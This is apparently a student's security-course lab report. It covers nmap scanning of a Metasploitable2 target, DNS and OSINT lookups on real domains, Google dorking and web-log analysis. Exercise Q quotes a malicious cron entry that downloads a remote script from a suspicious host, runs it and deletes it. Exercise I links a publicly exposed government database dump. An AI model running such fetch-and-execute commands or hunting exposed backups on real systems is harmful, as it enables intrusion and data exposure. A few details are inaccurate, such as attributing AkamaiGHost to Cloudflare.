# Roadmap 02 - Exploration on vulnerable environments

**Author**: Enricco Gemha

**Date**: 03/07/2024

## Task 01 - Target inspection

### Discover the target machine IP

After booting up both machines, Kali (source) and MetaExploitable2 (target), on the same network (bridged connection), I executed an `ip a` on source machine, which returned that eth0 has a broadcast of **172.20.10.7/28**. Therefore, I ran a `nmap -sP 172.20.10.7/28` that did a ping on each of the IPs on this subnet, returning three IPs: **172.20.10.1, 172.20.10.6, and 172.20.10.7**. With a quick thought, we can exclude the IP 172.20.10.1, which is always related to the gateway on a subnet. We can also exclude the 172.20.10.7, because it is the IP that is associated with the source machine (Kali), as seen in the output of `ip a`. This leaves us with the IP **172.20.10.6** for the target (MetaExploitable).

![Task 01 - Exercise 00](./docs/img/task01-exercise00.png)

### Exercise A - Scan port 21 on target

In order to learn which program is running on the port 21 in the target machine, I executed a `telnet 172.20.10.6 21` command, which returned a FTP server, vsFTPd, in the version 2.3.4.

![Task 01 - Exercise A](./docs/img/task01-exerciseA.png)

### Exercise B - Footprint

Using the command `sudo nmap -O 172.20.10.6` which shows all the open ports for the target. It also shows the MAC address (08:00:27:7D:5C:5C). It is running a Linux 2.6.X.

![Task 01 - Exercise B](./docs/img/task01-exerciseB.png)

### Exercise C - List vulnerabilities on port 21 and 445

Using the command `nmap 172.20.10.6 -p 21,445 -sV --script vuln` I am able to learn that port 21 is running FTP and 445 SMBD. It also shows that this version of vsFTPd (2.3.4) is vulnerable to backdoors, as reported in 2011-07-04.

![Task 01 - Exercise C](./docs/img/task01-exerciseC.png)

### Exercise D - Discover exploit for aforementioned vulnerability

The following link [ScaryBeastSecurity](https://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html) suggested by nmap in the previous screenshot, shows a backdoor installed in the redistributable file for vsFTPd.

![Task 01 - Exercise D](./docs/img/task01-exerciseD.png)

### Exercise E - Find a high risk CVE on ports 3306 and 5432

Running the command `nmap 172.20.10.6 -p 3306,5432 -sV --script vuln`, we can see three vulnerabilities in the PostgreSQL process. However, there's only one classified as high risk, which is related to the OpenSSL, the [**ssl-ccs-injection**](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224).

![Task 01 - Exercise E-01](./docs/img/task01-exerciseE-01.png)

![Task 01 - Exercise E-02](./docs/img/task01-exerciseE-02.png)

### Exercise F - Gathering information from [IETF](ietf.org)

- i. What's the associated IP?

  - The IP associated with the name ietf.org is **104.16.44.99**, that is shown when executing `ping ietf.org`. ![Task 01 - Exercise F-01](./docs/img/task01-exerciseF-01.png)

- ii. What are its DNS servers?

  - The application uses Cloudflare to manage the DNS. There are two name servers from Cloudflare responding to this domain, **jill.ns.cloudflare.com.** and **ken.ns.cloudflare.com.**, with a total of six IPs associated with these two name servers. ![Task 01 - Exercise F-02](./docs/img/task01-exerciseF-02.png)

- iii. Is there any e-mail server associated to this name? What is its name and IP?

  - Yes, there is. The name is **mail.ietf.org** and its IP is **50.223.129.194**. ![Task 01 - Exercise F-03](./docs/img/task01-exerciseF-03.png)

### Exercise G - Choose a website and answer the questions below

- i. What are the DNS servers responsible for this domain?

  - The domain **steampowered.com** is managed by the following DNS servers: **a7-66.akam.net.**, **a24-64.akam.net.**, **a2-64.akam.net.**, **a1-194.akam.net.**, **a9-66.akam.net.**, and **a22-67.akam.net.**. ![Task 01 - Exercise G-01](./docs/img/task01-exerciseG-01.png)

- ii. Are there other services hosted on this website? Who are they?

  - Yes, there is a Mail (MX) Service. ![Task 01 - Exercise G-02](./docs/img/task01-exerciseG-01.png)

- iii. What is the Web Server and OS that host this website? What were its last alterations?

  - The Web Server that hosts [Steam](steampowered.com) is **nginx**. However if we analyze Nikto's output on the screenshot two below, we can see it redirects from *nginx* to **AkamaiGHost**. This makes sense due to the fact that *nginx* is a load balancer, therefore just manages the traffic. On the other hand, *AkamaiGHost* is the WAF for this application. ![Task 01 - Exercise G-03-01](./docs/img/task01-exerciseG-03-01.png)
  
  - Unfortunately, it was not possible to determine the OS that hosts the website, as said by `nmap -O steampowered.com`, **"no OS matches for host"**. ![Task 01 - Exercise G-03-02](./docs/img/task01-exerciseG-03-02.png)

  - There's a **redirect to the subdomain *store.steampowered.com*** and a **server change from nginx to AkamaiGHost**. ![Task 01 - Exercise G-03-03](./docs/img/task01-exerciseG-03-03.png)

- iv. What technologies does this website uses?

  - As mentioned before, this website uses technologies such as a load balancer (nginx) and a WAF (AkamaiGHost).

- v. Is there any WAF protecting this website?

  - As mentioned previously, yes, there is, AkaiGHost, from Cloudflare.

- vi. The domain has a configured e-mail server? What are the IPs?

  - Yes, it does have a configured e-mail server (MX), **smtp.steampowered.com.**. Its IP address is **208.64.202.36**. ![Task 01 - Exercise G-03-06](./docs/img/task01-exerciseG-03-06.png)

### Exercise H - Mapping CMS

The mapping of [rodolfoavelino.com.br](rodolfoavelino.com.br)'s domain can be checked below:

### Exercise I - OSINT

- i. What's the CNPJ responsible for the domain [insper.edu.br](insper.edu.br)?

  - The CNPJ is **06.070.152/0001-47**, as shown in this Google search. ![Task 01 - Exercise I-01](./docs/img/task01-exerciseI-01.png)

- ii. How many articles does Rodolfo Avelino have in [uol.com.br](uol.com.br)?

  - After applying Google Dork techniques to the search, it is possible to find 14 articles featuring Rodolfo Avelino, by counting them one by one in Google search results. ![Task 01 - Exercise I-02](./docs/img/task01-exerciseI-02.png)

- iii. Find a URL that may contain backup files (security copies), insecurely exposed.

  - After some Google Dork, I was able to find a URL from Brazilian Government containing an PostgreSQL dump, probably froma backup, in the URL: [https://softwarepublico.gov.br/gitlab/gsan/gsan/raw/21f3a1154da63935ee2fcd6d2aa9bab86a2494f3/projects/migrations/scripts/bootstrap.sql](https://softwarepublico.gov.br/gitlab/gsan/gsan/raw/21f3a1154da63935ee2fcd6d2aa9bab86a2494f3/projects/migrations/scripts/bootstrap.sql). ![Task 01 - Exercise I-03](./docs/img/task01-exerciseI-03.png)

### Exercise J - Search for a PDF containing "SUPERFATURAMENTO NO VALOR" in hosted pages by the "Tribunal de Contas do Estado" from any state

As result of my Google Dork search I found many files contains the aforementioned specifications, like [https://decisoes.tce.go.gov.br/ConsultaDecisoes/CarregaDocumentoAssinadoPDF?idDocumento=381431202442452371&tipoDecisao=341512](https://decisoes.tce.go.gov.br/ConsultaDecisoes/CarregaDocumentoAssinadoPDF?idDocumento=381431202442452371&tipoDecisao=341512). It can be seen in the image below.

![Task 01 - Exercise J](./docs/img/task01-exerciseJ.png)

## Task 02 - Exploration

### Exercise K **is missing**

### Exercise L - What is the Log format presented in `log1`

The Log format presented is combined, due to the fact that we can see the following pattern:

- Remote host (IP address)

- Remote logname ("-" for unknown)

- Remote user ("-" for unknown)

- Date and time

- Request line from the client (method, path, protocol)

- Status code

- Size of response in bytes

- Referer header ("-" for unknown)

- User-agent header

### Exercise M - The file `log1` has some lines where the beginning is a date. What type of log are these?

These log lines beginning with a date are system logs, also known as **syslog**. They are generated on startup, system changes, unexpected shutdowns, error and warnings. All the most known OSs use this type of recording for system events. Below you can see the similarity between the logs beginning with date from`log1` and the logs generated by Ubuntu.

![Task 02 - Exercise M](./docs/img/task02-exerciseM.png)

### Exercise N - List the IPs that you consider suspect in `log1`

The IP **118.25.149.110** is very suspicious, due to many attempts to access various PHP scripts on the server within a short period of time.

The same can be saide to the IP **51.75.28.10**, which, within a very short window of time, attempts many request for scripts associated with Jenkins servers.

### Exercise O - Conduct research on APT (Advanced Persistent Threat) and comment on its characteristics

As stated by the company [Imperva](https://www.imperva.com/learn/application-security/apt-advanced-persistent-threat/):

> An advanced persistent threat (APT) is a broad term used to describe an attack campaign in which an intruder, or team of intruders, establishes an illicit, long-term presence on a network in order to mine highly sensitive data.
> The targets of these assaults, which are very carefully chosen and researched, typically include large enterprises or governmental networks. The consequences of such intrusions are vast, and include:
> - Intellectual property theft (e.g., trade secrets or patents)
> - Compromised sensitive information (e.g., employee and user private data)
> - The sabotaging of critical organizational infrastructures (e.g., database deletion)
> - Total site takeovers

Its stages are Infiltration, Expansion, and Extraction.

These are some of the measures that they suggest to prevent APT progression:

![Task 02 - Exercise O](./docs/img/task02-exerciseO.jpg)

### Exercise P - Exploit another vulnerability (not presented in this roadmap) in the target machine and present evidence

In the screenshot below we can notice that the port 2049 is open and running the NFS (Network File System). This becomes particularly dangerous because the target machine becomes accessible to any other machine on the network to connect and utilize NFS.

![Task 02 - Exercise P](./docs/img/task01-exerciseB.png)

### Exercise Q - Identify a behavior in `log2` which may cause a security incident on the system

There's a very suspicious behavior, that may cause a security incident on the system, in the 8th line of the `log2` file, which is:

```txt
Sep 16 21:45:01 vmi147857 CRON[19629]: (www-data) CMD (wget -q -O xxxd http://hello.hellodolly777.xyz/xxxd && chmod 0755 xxxd && /bin/sh xxxd /var/www/html/site 24 && rm -f xxxd)
```

There are several red flags, like:

- Downloading from an unknown source;
- Executing without verification;
- Very unusual name for a website;
- Running as a privileged user, as the CRON job is executing under the www-data user, which may have access to sensitive data.
- The file is deleted after execution, making it harder to trace its actions afterwards.
